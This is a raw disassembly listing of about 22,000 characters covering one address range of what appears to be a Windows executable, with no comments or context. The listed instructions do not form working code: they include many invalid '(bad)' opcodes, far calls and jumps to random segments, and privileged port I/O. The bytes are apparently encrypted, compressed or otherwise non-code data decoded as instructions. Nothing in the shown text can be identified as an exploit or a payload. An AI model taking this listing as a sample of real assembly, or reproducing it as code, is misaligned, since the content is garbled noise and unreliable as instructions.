  41de9d:	and    ah,BYTE PTR [esi-0x1d]
  41dea0:	call   0xa6d6:0x3ac4e18b
  41dea7:	in     eax,dx
  41dea8:	dec    edx
  41dea9:	js     0x41de95
  41deab:	cdq    
  41deac:	xor    al,0xf1
  41deae:	inc    eax
  41deaf:	push   eax
  41deb0:	sbb    cl,BYTE PTR [edx]
  41deb2:	inc    ebx
  41deb3:	inc    eax
  41deb4:	sub    esi,DWORD PTR [eax-0x2e]
  41deb7:	sbb    BYTE PTR [eax+0x65a53ae3],0xab
  41debe:	jnp    0x41dec4
  41dec0:	pop    ebp
  41dec1:	aam    0x65
  41dec3:	xor    esi,DWORD PTR [eax]
  41dec5:	dec    esi
  41dec6:	inc    ebp
  41dec7:	pop    ds
  41dec8:	call   ebp
  41deca:	push   eax
  41decb:	jp     0x41de71
  41decd:	push   ecx
  41dece:	js     0x41df18
  41ded0:	push   ds
  41ded1:	push   ss
  41ded2:	aas    
  41ded3:	dec    esp
  41ded4:	fwait
  41ded5:	mov    eax,ds:0xe4ec2a02
  41deda:	test   DWORD PTR [edi+0x2eb16fac],0xafae7698
  41dee4:	and    eax,0xda784ae3
  41dee9:	sub    DWORD PTR [edi+0x15726acd],edx
  41deef:	inc    eax
  41def0:	(bad)  
  41def1:	push   ebp
  41def2:	cmc    
  41def3:	cld    
  41def4:	pop    eax
  41def5:	cmove  edx,DWORD PTR ds:0xed6eb4e0
  41defc:	add    eax,0x26c5d2af
  41df01:	dec    ecx
  41df02:	out    dx,eax
  41df03:	adc    al,0x63
  41df05:	pop    ss
  41df06:	retf   
  41df07:	loop   0x41df2b
  41df09:	and    cl,BYTE PTR [edx]
  41df0b:	dec    edi
  41df0c:	add    bl,BYTE PTR [esi+ebp*1]
  41df0f:	ins    BYTE PTR es:[edi],dx
  41df10:	addr16 push ecx
  41df12:	mov    edi,0x6317ce32
  41df17:	ins    BYTE PTR es:[edi],dx
  41df18:	cmp    DWORD PTR [esi],edx
  41df1a:	dec    ecx
  41df1b:	mov    cl,0x2f
  41df1d:	leave  
  41df1e:	push   0xbbf10ad3
  41df23:	sub    BYTE PTR [ebp-0x7055f3fb],0xb9
  41df2a:	dec    eax
  41df2b:	pop    esp
  41df2c:	cld    
  41df2d:	jg     0x41df83
  41df2f:	inc    ecx
  41df30:	push   es
  41df31:	inc    esp
  41df32:	jmp    0xf698e195
  41df37:	stos   BYTE PTR es:[edi],al
  41df38:	popa   
  41df39:	pop    esi
  41df3a:	jge    0x41df99
  41df3c:	out    0x29,al
  41df3e:	mov    ds,WORD PTR [eax]
  41df40:	ins    BYTE PTR es:[edi],dx
  41df41:	fistp  QWORD PTR [esi-0x3d5b48d8]
  41df47:	and    eax,0xf8b6efc7
  41df4c:	in     eax,0xc6
  41df4e:	shl    DWORD PTR [eax-0x22],0x6b
  41df52:	mov    WORD PTR [edi],?
  41df54:	xchg   ecx,eax
  41df55:	into   
  41df56:	out    0x3a,eax
  41df58:	jnp    0x41df48
  41df5a:	mov    DWORD PTR [eax],ebx
  41df5c:	stos   BYTE PTR es:[edi],al
  41df5d:	or     esi,0xffffffa3
  41df60:	inc    ebx
  41df61:	and    bl,ah
  41df63:	mov    dh,0x89
  41df65:	iret   
  41df66:	ds mov eax,0xf7c80352
  41df6c:	pop    ecx
  41df6d:	in     eax,0x56
  41df6f:	popf   
  41df70:	cmp    ah,BYTE PTR [edx+0x3d]
  41df73:	add    esi,DWORD PTR [esi+0x1399f610]
  41df79:	push   edi
  41df7a:	sub    al,0x11
  41df7c:	fs inc esp
  41df7e:	pop    ebx
  41df7f:	leave  
  41df80:	push   ebp
  41df81:	mov    al,ds:0x9ea08290
  41df86:	ss pop edx
  41df88:	pop    eax
  41df89:	cmp    BYTE PTR [ecx],al
  41df8b:	fs push eax
  41df8d:	addr16 (bad) 
  41df8f:	in     eax,0x8d
  41df91:	shl    BYTE PTR [ebx],1
  41df93:	mov    dh,0x18
  41df95:	shl    BYTE PTR [edi],1
  41df97:	ds scas eax,DWORD PTR es:[edi]
  41df99:	ret    0x2bb9
  41df9c:	jecxz  0x41dfcc
  41df9e:	int3   
  41df9f:	loopne 0x41e006
  41dfa1:	xor    eax,0xe89a8ef7
  41dfa6:	xchg   DWORD PTR [edx+edx*8+0x54],ebp
  41dfaa:	ret    
  41dfab:	lahf   
  41dfac:	pusha  
  41dfad:	arpl   WORD PTR [ebp-0x70],cx
  41dfb0:	ror    DWORD PTR [ebx],cl
  41dfb2:	aas    
  41dfb3:	retf   0x82f4
  41dfb6:	mov    dh,bh
  41dfb8:	mov    edx,0x130de358
  41dfbd:	(bad)  
  41dfbe:	call   0x730a:0x889ecdb1
  41dfc5:	test   DWORD PTR [esi-0x69],esp
  41dfc8:	xor    eax,DWORD PTR [eax+0x2e]
  41dfcb:	pop    eax
  41dfcc:	pop    edx
  41dfcd:	popf   
  41dfce:	fimul  DWORD PTR [ebp+0x779b0918]
  41dfd4:	pop    es
  41dfd5:	cdq    
  41dfd6:	jmp    DWORD PTR [esi+0x5c]
  41dfd9:	cmc    
  41dfda:	mov    dh,0xb9
  41dfdc:	sbb    al,0x5a
  41dfde:	sub    ch,BYTE PTR ds:0xae1304da
  41dfe4:	xchg   ecx,eax
  41dfe5:	dec    ebp
  41dfe6:	or     BYTE PTR fs:0x337175a0,0xb3
  41dfee:	enter  0x6498,0xab
  41dff2:	aas    
  41dff3:	sub    cl,BYTE PTR [edi+0x20eb5ab5]
  41dff9:	fsub   QWORD PTR [esi]
  41dffb:	test   al,0xda
  41dffd:	popf   
  41dffe:	stos   DWORD PTR es:[edi],eax
  41dfff:	out    0x6b,eax
  41e001:	mov    al,ds:0x730e74d
  41e006:	pop    esp
  41e007:	xor    eax,0xe7c8f19d
  41e00c:	loop   0x41dfda
  41e00e:	or     edi,DWORD PTR [eax-0xc]
  41e011:	mov    ch,0x5
  41e013:	sbb    esi,esp
  41e015:	dec    esi
  41e016:	imul   edx,DWORD PTR [eax-0x291be258],0xfffffff1
  41e01d:	adc    DWORD PTR [ecx+ecx*2+0x76],0xfbb08794
  41e025:	sbb    BYTE PTR [ebx-0x4341644],bh
  41e02b:	sbb    DWORD PTR [eax],ebx
  41e02d:	dec    ebx
  41e02e:	lds    ecx,FWORD PTR [eax-0x50]
  41e031:	data16 fnstsw WORD PTR [edi-0x5b]
  41e035:	aaa    
  41e036:	aas    
  41e037:	fcom   DWORD PTR [ebx]
  41e039:	fldenv [eax]
  41e03b:	adc    eax,eax
  41e03d:	add    bl,BYTE PTR [eax-0x34]
  41e040:	mov    edi,0xcb0df688
  41e045:	push   edi
  41e046:	or     esp,ebp
  41e048:	xchg   DWORD PTR [eax],edi
  41e04a:	and    ecx,eax
  41e04c:	repz jg 0x41e05f
  41e04f:	repz cmp al,0x9
  41e052:	lods   al,BYTE PTR ds:[esi]
  41e053:	mov    eax,0x1e54c2f0
  41e058:	mov    ecx,0x30a082b5
  41e05d:	aad    0x3a
  41e05f:	add    esi,DWORD PTR [edi-0x7bc4e095]
  41e065:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41e066:	inc    edi
  41e067:	mov    ebp,0x1b4ebe3a
  41e06c:	lods   eax,DWORD PTR ds:[esi]
  41e06d:	out    0xe,al
  41e06f:	in     al,dx
  41e070:	dec    ebx
  41e071:	dec    edi
  41e072:	jae    0x41e085
  41e074:	cld    
  41e075:	fisub  DWORD PTR [edi]
  41e077:	push   cs
  41e078:	inc    eax
  41e079:	outs   dx,DWORD PTR ds:[esi]
  41e07a:	ret    0x7ca3
  41e07d:	out    dx,al
  41e07e:	inc    ecx
  41e07f:	iret   
  41e080:	add    al,0xdd
  41e082:	push   0xbbe0dde4
  41e087:	jno    0x41e0fd
  41e089:	imul   BYTE PTR [esp-0x42]
  41e08d:	mov    eax,0xf9320b10
  41e092:	loope  0x41e0c2
  41e094:	je     0x41e0a8
  41e096:	add    ebx,DWORD PTR [ebx]
  41e098:	mov    ecx,0x64f34c10
  41e09d:	cmp    BYTE PTR [ebp-0x21ec3bcd],dl
  41e0a3:	sbb    DWORD PTR [esi],edi
  41e0a5:	push   ecx
  41e0a6:	mov    esp,es
  41e0a8:	loopne 0x41e02d
  41e0aa:	cli    
  41e0ab:	or     dl,BYTE PTR [edx+0x3]
  41e0ae:	(bad)  
  41e0af:	mov    eax,0xb4409a5b
  41e0b4:	sti    
  41e0b5:	lds    edi,FWORD PTR [eax-0x2eed5988]
  41e0bb:	sbb    DWORD PTR [edi],ecx
  41e0bd:	imul   esp,edx,0xffffff82
  41e0c0:	fnstsw WORD PTR [esi-0xd]
  41e0c3:	loop   0x41e0bb
  41e0c5:	inc    eax
  41e0c6:	hlt    
  41e0c7:	and    DWORD PTR [edx],eax
  41e0c9:	int    0x75
  41e0cb:	fcomp  DWORD PTR ds:0x6b68b24f
  41e0d1:	cdq    
  41e0d2:	push   es
  41e0d3:	mov    ds:0x52be09ad,al
  41e0d8:	das    
  41e0d9:	hlt    
  41e0da:	push   0x2e9b38c
  41e0df:	mov    ds:0x83be4a57,al
  41e0e4:	cs inc eax
  41e0e6:	repz xlat BYTE PTR ds:[ebx]
  41e0e8:	push   esi
  41e0e9:	cmp    ecx,esi
  41e0eb:	jbe    0x41e12e
  41e0ed:	cmp    ebx,ebx
  41e0ef:	or     cl,BYTE PTR [edx+esi*8]
  41e0f2:	mov    edx,0xa317024a
  41e0f7:	sub    dl,dl
  41e0f9:	hlt    
  41e0fa:	adc    dh,ch
  41e0fc:	sbb    DWORD PTR [edi],0x4e8865b7
  41e102:	pop    eax
  41e103:	jp     0x41e0e8
  41e105:	test   bh,0xa4
  41e108:	test   DWORD PTR [edi+ebp*2-0x20f1c61e],edi
  41e10f:	ror    DWORD PTR [edi-0x3acd4ce],cl
  41e115:	aaa    
  41e116:	jbe    0x41e16c
  41e118:	xchg   ebx,eax
  41e119:	dec    edi
  41e11a:	adc    BYTE PTR [edi],bh
  41e11c:	hlt    
  41e11d:	cmp    DWORD PTR [edi+0x2fa4261a],esp
  41e123:	call   0x10466d0
  41e128:	gs dec edi
  41e12a:	int3   
  41e12b:	bound  eax,QWORD PTR [edi-0x79abac09]
  41e131:	add    eax,edx
  41e133:	jo     0x41e197
  41e135:	adc    al,0x3a
  41e137:	fwait
  41e138:	mov    esi,0x9df80ee7
  41e13d:	add    al,0xc1
  41e13f:	add    ebp,DWORD PTR [ebx-0x21]
  41e142:	stos   DWORD PTR es:[edi],eax
  41e143:	(bad)
  41e146:	and    bl,BYTE PTR [eax+0xa]
  41e149:	pop    edx
  41e14a:	jo     0x41e16f
  41e14c:	xor    dh,ah
  41e14e:	pop    esp
  41e14f:	and    edx,edi
  41e151:	inc    ebx
  41e152:	(bad)  
  41e154:	fidiv  WORD PTR [ecx+ecx*8+0x1720b322]
  41e15b:	(bad)  
  41e15c:	jno    0x41e121
  41e15e:	mov    eax,0xa92b9d57
  41e163:	or     BYTE PTR [edi-0x6df70179],dl
  41e169:	loop   0x41e0ef
  41e16b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41e16c:	(bad)  
  41e16d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41e16e:	lods   al,BYTE PTR ds:[esi]
  41e16f:	xor    eax,0x3fafab32
  41e174:	pusha  
  41e175:	jecxz  0x41e1da
  41e177:	add    al,0xa0
  41e179:	(bad)  [ecx+0x127a6ea3]
  41e17f:	or     edi,DWORD PTR [esi]
  41e181:	lea    esi,[eax]
  41e183:	lahf   
  41e184:	jne    0x41e1d1
  41e186:	out    0x48,eax
  41e188:	jno    0x41e113
  41e18a:	call   0x6d9456dc
  41e18f:	fnstenv [esi]
  41e191:	ret    0x6db3
  41e194:	mov    edi,0x8a8d829b
  41e199:	stos   BYTE PTR es:[edi],al
  41e19a:	add    al,0x1
  41e19c:	movmskps edx,xmm3
  41e19f:	je     0x41e176
  41e1a1:	outs   dx,BYTE PTR ds:[esi]
  41e1a2:	cmp    eax,0x5fd01ae5
  41e1a7:	inc    bl
  41e1a9:	ret    
  41e1aa:	or     DWORD PTR ds:0x226f7fdf,ebp
  41e1b0:	fnstcw WORD PTR [esp+edx*4]
  41e1b3:	sbb    DWORD PTR [edi],0x1bfc3298
  41e1b9:	adc    al,0x75
  41e1bb:	dec    ecx
  41e1bc:	add    dl,al
  41e1be:	es imul ebx,ebp,0x5642b13d
  41e1c5:	out    0xca,al
  41e1c7:	icebp  
  41e1c8:	push   edx
  41e1c9:	dec    eax
  41e1ca:	test   DWORD PTR [esi+0x3f1c2eec],ebp
  41e1d0:	add    al,0x69
  41e1d2:	out    0x9,eax
  41e1d4:	imul   eax,DWORD PTR [edx+0x3a],0x72502d46
  41e1db:	sbb    ah,BYTE PTR [ecx-0x65f0830]
  41e1e1:	jmp    0x6e22:0x29618957
  41e1e8:	push   0xfffffff6
  41e1ea:	ja     0x41e268
  41e1ec:	pushf  
  41e1ed:	stc    
  41e1ee:	ins    DWORD PTR es:[edi],dx
  41e1ef:	fadd   QWORD PTR fs:[ebx-0x5d68a022]
  41e1f6:	enter  0xc613,0xd0
  41e1fa:	pusha  
  41e1fb:	dec    eax
  41e1fc:	push   0x64
  41e1fe:	not    al
  41e200:	lock fidiv DWORD PTR [edi+edi*4]
  41e204:	clc    
  41e205:	xlat   BYTE PTR gs:[ebx]
  41e207:	or     eax,0x45420883
  41e20c:	(bad)  
  41e20d:	cdq    
  41e20e:	mov    DWORD PTR ds:0x73e70396,edx
  41e214:	jmp    0x41e1bb
  41e216:	xchg   esi,eax
  41e217:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41e218:	out    0x4e,al
  41e21a:	inc    edx
  41e21b:	clc    
  41e21c:	pop    esi
  41e21d:	ret    
  41e21e:	(bad)  
  41e21f:	cs inc esi
  41e221:	push   ecx
  41e222:	push   ebx
  41e223:	aam    0xc5
  41e225:	push   esp
  41e226:	mov    al,0x5d
  41e228:	push   ebp
  41e229:	popf   
  41e22a:	arpl   WORD PTR [ebp+0x70bfbb92],bp
  41e230:	mov    ebp,0xdd8bd217
  41e235:	add    eax,0xb2fe130
  41e23a:	push   DWORD PTR gs:[esi+0x555e9115]
  41e241:	and    BYTE PTR [ebp+0x68],ch
  41e244:	cmp    ah,BYTE PTR [ecx]
  41e246:	pop    edi
  41e247:	and    cl,BYTE PTR [ecx]
  41e249:	mov    bl,0x21
  41e24b:	cmc    
  41e24c:	mov    bl,0x67
  41e24e:	mov    edx,0xa2781357
  41e253:	mov    al,0x8e
  41e255:	cmp    eax,0x846f9959
  41e25a:	popa   
  41e25b:	sub    edx,DWORD PTR [eax-0x600f676f]
  41e261:	retf   0x74a5
  41e264:	sar    BYTE PTR [ecx+0x4f],1
  41e267:	ds mov bl,0x6b
  41e26a:	shl    ah,0xf6
  41e26d:	and    eax,0x4876295
  41e272:	leave  
  41e273:	adc    al,0x7b
  41e275:	loopne 0x41e214
  41e277:	push   0x62
  41e279:	or     ebp,DWORD PTR [ebx-0x42088331]
  41e27f:	mov    WORD PTR fs:[eax+0x45],fs
  41e283:	pop    ecx
  41e284:	add    BYTE PTR [ecx+0x60],ah
  41e287:	xor    al,0xae
  41e289:	xor    BYTE PTR [eax],dl
  41e28b:	sbb    ebp,ebp
  41e28d:	aam    0xd3
  41e28f:	ds pusha 
  41e291:	ja     0x41e239
  41e293:	inc    eax
  41e294:	rcpps  xmm1,XMMWORD PTR [edx-0x126947b2]
  41e29b:	mov    ecx,0xeaf4b808
  41e2a0:	jmp    0x982146ac
  41e2a5:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41e2a6:	jp     0x41e304
  41e2a8:	add    al,0xdb
  41e2aa:	cld    
  41e2ab:	leave  
  41e2ac:	inc    ebx
  41e2ad:	gs push esp
  41e2af:	or     cl,dl
  41e2b1:	jmp    0x5deb19df
  41e2b6:	xchg   edi,eax
  41e2b7:	popa   
  41e2b8:	je     0x41e336
  41e2ba:	outs   dx,DWORD PTR ds:[esi]
  41e2bb:	aam    0x94
  41e2bd:	jbe    0x41e306
  41e2bf:	mul    DWORD PTR [eax+0x5271e2d7]
  41e2c5:	js     0x41e247
  41e2c7:	arpl   WORD PTR [ecx],bx
  41e2c9:	ror    BYTE PTR [edx+edx*2+0x34bcd715],1
  41e2d0:	jno    0x41e276
  41e2d2:	outs   dx,DWORD PTR ds:[esi]
  41e2d3:	test   BYTE PTR [ebx-0x4c],ah
  41e2d6:	pop    edx
  41e2d7:	mov    al,0x1d
  41e2d9:	cmp    BYTE PTR [ebx+eax*1],cl
  41e2dc:	maskmovq mm2,(bad)
  41e2dd:	not    DWORD PTR [ecx-0x6d]
  41e2e0:	std    
  41e2e1:	cmp    eax,0xd100b8df
  41e2e6:	sahf   
  41e2e7:	imul   esi,ecx,0x1f
  41e2ea:	mov    dl,0x1b
  41e2ec:	sub    ebp,DWORD PTR [edx]
  41e2ee:	sub    BYTE PTR [ebx],al
  41e2f0:	ficom  DWORD PTR [esi]
  41e2f2:	neg    BYTE PTR [edx+0x4e]
  41e2f5:	ja     0x41e35d
  41e2f7:	and    edi,edx
  41e2f9:	nop
  41e2fa:	(bad)  
  41e2fb:	out    0x25,al
  41e2fd:	cdq    
  41e2fe:	jg     0x41e324
  41e300:	adc    eax,0xedf08c4d
  41e305:	and    al,0x32
  41e307:	push   ebp
  41e308:	xchg   edi,eax
  41e309:	sahf   
  41e30a:	adc    BYTE PTR [ebp+0x37e651a5],al
  41e310:	rol    edi,1
  41e312:	mov    dh,0xc4
  41e314:	pop    ss
  41e315:	ja     0x41e298
  41e317:	adc    al,0x3d
  41e319:	pop    edx
  41e31a:	stc    
  41e31b:	push   ebx
  41e31c:	mov    eax,ds:0xddc0f174
  41e321:	add    eax,0x8f9b76ce
  41e326:	add    al,0x81
  41e328:	inc    edx
  41e329:	fwait
  41e32a:	fwait
  41e32b:	mov    edi,0xd0aafee7
  41e330:	or     al,0x6c
  41e332:	ins    DWORD PTR es:[edi],dx
  41e333:	in     eax,dx
  41e334:	fidivr WORD PTR [eax-0x62]
  41e337:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41e338:	inc    esp
  41e339:	dec    eax
  41e33a:	das    
  41e33b:	outs   dx,BYTE PTR ds:[esi]
  41e33c:	sbb    eax,0x36bdf199
  41e341:	push   ebp
  41e342:	aam    0xb8
  41e344:	ret    0x4cc6
  41e347:	pusha  
  41e348:	in     eax,dx
  41e349:	mov    ch,0x95
  41e34b:	xlat   BYTE PTR ds:[ebx]
  41e34c:	mov    esp,0xae693f52
  41e351:	hlt    
  41e352:	call   0x3e95:0x964d54b6
  41e359:	fwait
  41e35a:	xlat   BYTE PTR ds:[ebx]
  41e35b:	fwait
  41e35c:	(bad)
  41e35f:	jp     0x41e327
  41e361:	pop    edi
  41e362:	sbb    al,0x57
  41e364:	int    0xa4
  41e366:	fisubr WORD PTR [ebp+0x49411b77]
  41e36c:	je     0x41e392
  41e36e:	call   0xe248:0x469a9ce1
  41e375:	and    BYTE PTR [esi+eiz*2-0x4c6139be],dh
  41e37c:	pop    edx
  41e37d:	rcr    BYTE PTR [ebx],cl
  41e37f:	cmc    
  41e380:	pop    edi
  41e381:	mov    bl,0x53
  41e383:	or     BYTE PTR [ecx],bh
  41e385:	jae    0x41e3f8
  41e387:	xchg   BYTE PTR [eax],ah
  41e389:	dec    edi
  41e38a:	adc    bl,BYTE PTR [edi]
  41e38c:	mov    bl,0xc9
  41e38e:	enter  0xf35a,0x42
  41e392:	fistp  DWORD PTR [edi+edx*4-0x51]
  41e396:	cmp    BYTE PTR [esi],cl
  41e398:	(bad)  
  41e399:	fld    DWORD PTR [esi-0x30]
  41e39c:	adc    BYTE PTR [esi],ch
  41e39e:	in     al,dx
  41e39f:	dec    ecx
  41e3a0:	lock shl eax,1
  41e3a3:	in     al,dx
  41e3a4:	add    ebx,DWORD PTR [esi-0x3f019293]
  41e3aa:	in     eax,dx
  41e3ab:	retf   
  41e3ac:	and    ebp,DWORD PTR [esi]
  41e3ae:	pop    edx
  41e3af:	xchg   edx,eax
  41e3b0:	rcr    BYTE PTR [ecx-0x41],1
  41e3b3:	cmc    
  41e3b4:	lock scas al,BYTE PTR es:[edi]
  41e3b6:	and    DWORD PTR [edi+eiz*1-0x72f96c59],edx
  41e3bd:	sbb    ecx,DWORD PTR [eax+ebp*2+0x5f]
  41e3c1:	push   eax
  41e3c2:	rol    dh,cl
  41e3c4:	mov    BYTE PTR [ecx+ecx*1],bl
  41e3c7:	shl    BYTE PTR [eax+0x73],1
  41e3ca:	mov    esi,0xd23c3ebd
  41e3cf:	dec    eax
  41e3d0:	stc    
  41e3d1:	retf   0x3a3e
  41e3d4:	clc    
  41e3d5:	ret    
  41e3d6:	xchg   BYTE PTR [edi-0x51],bl
  41e3d9:	(bad)  
  41e3da:	ror    DWORD PTR [ecx+0x50d33cd],cl
  41e3e0:	loop   0x41e44d
  41e3e2:	pop    esp
  41e3e3:	rol    DWORD PTR gs:[ebx],cl
  41e3e6:	pop    esi
  41e3e7:	rcr    BYTE PTR [esi],cl
  41e3e9:	jp     0x41e403
  41e3eb:	fimul  DWORD PTR [esi+edx*1]
  41e3ee:	xor    bl,BYTE PTR [ebx+0x22]
  41e3f1:	jnp    0x41e445
  41e3f3:	or     esi,DWORD PTR [edi]
  41e3f5:	rcr    bh,0xef
  41e3f8:	mov    esi,0xf2449f8c
  41e3fd:	out    0xa8,al
  41e3ff:	inc    eax
  41e400:	cli    
  41e401:	cmp    bl,BYTE PTR [ebp+0x9a817cd]
  41e407:	inc    BYTE PTR [esi-0x32a76941]
  41e40d:	neg    bh
  41e40f:	adc    eax,0x4ddac702
  41e414:	bound  esi,QWORD PTR [edi-0x30]
  41e417:	fidivr WORD PTR [eax-0xcfa0e12]
  41e41d:	adc    al,0xd9
  41e41f:	sub    DWORD PTR [edi-0x1efbc9da],ebp
  41e425:	shr    BYTE PTR ds:0xed8ed02f,cl
  41e42b:	push   esi
  41e42c:	dec    ecx
  41e42d:	mov    esp,0xda6eac9f
  41e432:	pop    ebx
  41e433:	je     0x41e43e
  41e435:	push   cs
  41e436:	in     eax,0x1c
  41e438:	(bad)  
  41e439:	loopne 0x41e49c
  41e43b:	push   esp
  41e43c:	das    
  41e43d:	pop    ecx
  41e43e:	iret   
  41e43f:	jb     0x41e44d
  41e441:	sbb    ecx,DWORD PTR [eax-0x51]
  41e444:	sbb    dh,dl
  41e446:	js     0x41e475
  41e448:	dec    edx
  41e449:	mov    eax,0x13b76226
  41e44e:	xlat   BYTE PTR ds:[ebx]
  41e44f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41e450:	xor    DWORD PTR [esi+0xc],0xffffff87
  41e454:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41e455:	bswap  ecx
  41e457:	imul   esp,DWORD PTR [ebp-0x6b8f7166],0xffffffe1
  41e45e:	hlt    
  41e45f:	xchg   ebp,eax
  41e460:	sbb    ecx,ecx
  41e462:	rdpmc  
  41e464:	cmc    
  41e465:	adc    ah,BYTE PTR [ebp-0x52a5bc1e]
  41e46b:	lods   eax,DWORD PTR ds:[esi]
  41e46c:	sub    eax,0xd29ca293
  41e471:	sub    BYTE PTR [ebx+0x65f858fc],cl
  41e477:	xor    eax,esp
  41e479:	mov    bh,0xfc
  41e47b:	push   0x50
  41e47d:	and    bh,dh
  41e47f:	in     al,0xfd
  41e481:	ins    BYTE PTR es:[edi],dx
  41e482:	(bad)  
  41e484:	adc    ecx,DWORD PTR gs:[eax]
  41e487:	not    DWORD PTR ds:0xd2603bfd
  41e48d:	sti    
  41e48e:	repnz in eax,dx
  41e490:	dec    edi
  41e491:	or     esi,DWORD PTR [edi]
  41e493:	sbb    dl,BYTE PTR [eax+0x5a]
  41e496:	test   al,0x88
  41e498:	mov    BYTE PTR [ecx],cl
  41e49a:	jmp    0x43bf25da
  41e49f:	jno    0x41e4a3
  41e4a1:	or     bh,ah
  41e4a3:	popa   
  41e4a4:	es inc esp
  41e4a6:	xchg   DWORD PTR [ebp-0x4b2258b8],esp
  41e4ac:	scas   eax,DWORD PTR es:[edi]
  41e4ad:	mov    edi,0x98454985
  41e4b2:	xchg   BYTE PTR [esi],bh
  41e4b4:	daa    
  41e4b5:	mov    ds:0xc4e02570,eax
  41e4ba:	push   ss
  41e4bb:	push   esp
  41e4bc:	inc    ecx
  41e4bd:	(bad)  
  41e4be:	icebp  
  41e4bf:	jns    0x41e4b9
  41e4c1:	ds push ebx
  41e4c3:	mov    bh,BYTE PTR [edx-0x3078aa11]
  41e4c9:	in     eax,0x40
  41e4cb:	scas   eax,DWORD PTR es:[edi]
  41e4cc:	or     esi,DWORD PTR [esi-0x16]
  41e4cf:	jmp    0x5fc8:0xe75da881
  41e4d6:	imul   eax,DWORD PTR [edi+0xb5934c6],0x728d5811
  41e4e0:	adc    ecx,eax
  41e4e2:	lea    ecx,[ecx+0x0]
  41e4e5:	stos   DWORD PTR es:[edi],eax
  41e4e6:	cwde   
  41e4e7:	or     al,0x5c
  41e4e9:	mov    ecx,0xde2e8a36
  41e4ee:	scas   eax,DWORD PTR es:[edi]
  41e4ef:	loop   0x41e53a
  41e4f1:	loopne 0x41e48b
  41e4f3:	cmp    BYTE PTR [esi+0x75],al
  41e4f6:	mov    esi,0xfbc73ed
  41e4fb:	sub    eax,0xe793b349
  41e500:	xchg   ecx,eax
  41e501:	fstp   TBYTE PTR [edi-0x51e3a94a]
  41e507:	hlt    
  41e508:	xchg   ebx,eax
  41e509:	cmp    al,bl
  41e50b:	pop    es
  41e50c:	arpl   WORD PTR ds:0x15b0cef6,sp
  41e512:	adc    BYTE PTR [eax+edi*2],al
  41e515:	std    
  41e516:	mov    ds:0xf60f5148,al
  41e51b:	add    DWORD PTR [ebp+0x32],ebx
  41e51e:	mov    edi,0x4c13b58f
  41e523:	jp     0x41e52e
  41e525:	push   ecx
  41e526:	mov    ebp,0x344d423d
  41e52b:	sbb    al,cl
  41e52d:	std    
  41e52e:	cmp    al,0x94
  41e530:	retf   
  41e531:	xchg   edx,eax
  41e532:	idiv   BYTE PTR [edx-0x44db450c]
  41e538:	sahf   
  41e539:	xchg   edx,eax
  41e53a:	aaa    
  41e53b:	xchg   ebx,eax
  41e53c:	sbb    DWORD PTR es:[ebx+0x3acb5fb7],edx
  41e543:	cmc    
  41e544:	jecxz  0x41e4ca
  41e546:	cdq    
  41e547:	push   esi
  41e548:	adc    ebp,DWORD PTR [edi-0x4d]
  41e54b:	mov    bh,0x17
  41e54d:	jne    0x41e525
  41e54f:	call   0xdf8adfc3
  41e554:	jb     0x41e5a7
  41e556:	cmp    ch,dh
  41e558:	ret    
  41e559:	push   0x2
  41e55b:	gs push ds
  41e55d:	fidivr WORD PTR [edx+0x249b4dbf]
  41e563:	add    cl,BYTE PTR [ecx]
  41e565:	aad    0xd8
  41e567:	ss inc eax
  41e569:	bound  eax,QWORD PTR [eax+0x27]
  41e56c:	cmp    edi,esp
  41e56e:	repnz cmp DWORD PTR [edx-0x4f],0x52
  41e573:	adc    bl,bh
  41e575:	hlt    
  41e576:	ds pop edx
  41e578:	push   ds
  41e579:	rcr    BYTE PTR [ebx+0x57],1
  41e57c:	aas    
  41e57d:	mov    gs,WORD PTR [esi]
  41e57f:	cmp    al,0xfb
  41e581:	or     cl,BYTE PTR [edi-0x61]
  41e584:	xchg   edi,eax
  41e585:	push   cs
  41e586:	add    ebp,esp
  41e588:	jmp    0x24a4b9f8
  41e58d:	inc    ebp
  41e58e:	shl    BYTE PTR [edi+0x43],0x29
  41e592:	push   edi
  41e593:	call   0xf96b42e0
  41e598:	mov    ebp,0x864de3f
  41e59d:	iret   
  41e59e:	add    esp,DWORD PTR [edx-0x4ef8cd55]
  41e5a4:	fwait
  41e5a5:	mov    ah,0xf5
  41e5a7:	retf   
  41e5a8:	int3   
  41e5a9:	dec    eax
  41e5aa:	mov    ds:0xa58bbb6c,al
  41e5af:	pop    esp
  41e5b0:	mov    bh,0x4d
  41e5b2:	jle    0x41e58d
  41e5b4:	dec    eax
  41e5b5:	cmp    BYTE PTR [ecx-0x584b8219],bl
  41e5bb:	dec    ebx
  41e5bc:	scas   al,BYTE PTR es:[edi]
  41e5bd:	adc    DWORD PTR [ebx+0x4aac892a],ebp
  41e5c3:	(bad)  
  41e5c5:	pop    ebp
  41e5c6:	cmp    al,0x70
  41e5c8:	addr16 inc ecx
  41e5ca:	popa   
  41e5cb:	xor    ebp,DWORD PTR [ebx-0x10e251c1]
  41e5d1:	ret    
  41e5d2:	jmp    0x2e43:0x3b7fa62b
  41e5d9:	dec    eax
  41e5da:	fistp  QWORD PTR [ecx]
  41e5dc:	sbb    eax,0x26d04bb
  41e5e1:	push   cs
  41e5e2:	ret    
  41e5e3:	lahf   
  41e5e4:	imul   ebx,DWORD PTR [eax+0x29f6452b],0x19
  41e5eb:	and    BYTE PTR [eax+0x62],al
  41e5ee:	int    0x48
  41e5f0:	dec    eax
  41e5f1:	dec    edi
  41e5f2:	sbb    eax,0x58b11777
  41e5f7:	in     al,0x18
  41e5f9:	cmc    
  41e5fa:	bound  ebx,QWORD PTR [eax+0x7261462f]
  41e600:	or     DWORD PTR [ecx],ebp
  41e602:	shl    BYTE PTR [ecx],1
  41e604:	sbb    DWORD PTR [edx],esi
  41e606:	push   ss
  41e607:	sbb    eax,DWORD PTR [ebx-0x4d]
  41e60a:	sbb    BYTE PTR [eax],0x31
  41e60d:	inc    ebp
  41e60e:	dec    esp
  41e60f:	ins    DWORD PTR es:[edi],dx
  41e610:	fwait
  41e611:	jbe    0x41e690
  41e613:	jno    0x41e645
  41e615:	std    
  41e616:	sbb    al,0xfa
  41e618:	cmc    
  41e619:	or     al,0x24
  41e61b:	retf   0xf2b8
